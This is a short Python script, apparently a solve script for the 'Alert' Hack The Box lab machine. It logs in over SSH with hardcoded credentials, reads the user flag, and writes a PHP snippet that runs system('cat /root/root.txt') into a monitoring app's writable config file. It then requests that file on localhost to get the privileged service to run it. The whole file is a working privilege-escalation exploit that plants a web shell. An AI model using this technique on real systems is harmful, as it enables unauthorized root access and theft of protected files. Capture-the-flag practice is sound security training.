import paramiko
import threading

# SSH Credentials
SSH_HOST = "alert.htb"
SSH_PORT = 22
SSH_USER = "albert"
SSH_PASSWORD = "manchesterunited"  # Or use a private key

# Commands to execute
COMMANDS = [
    "cat /home/albert/user.txt",           # Check current user
    """echo '<?php 
system("cat /root/root.txt");
?>' >> /opt/website-monitor/config/kill.php""",
    "curl http://127.0.0.1:8080/config/kill.php"
]

def ssh_tunnel():
    """Connect to SSH and execute commands"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to SSH
        client.connect(SSH_HOST, SSH_PORT, username=SSH_USER, password=SSH_PASSWORD)
        print(f"Connected to {SSH_HOST} via SSH\n")

        # Execute commands
        for command in COMMANDS:
            print(f"Executing: {command}")
            stdin, stdout, stderr = client.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()

            if output:
                print(f"OUTPUT:\n{output}")
            if error:
                print(f"ERROR:\n{error}")

        client.close()

    except Exception as e:
        print(f"SSH error: {e}")


if __name__ == "__main__":
    ssh_tunnel()
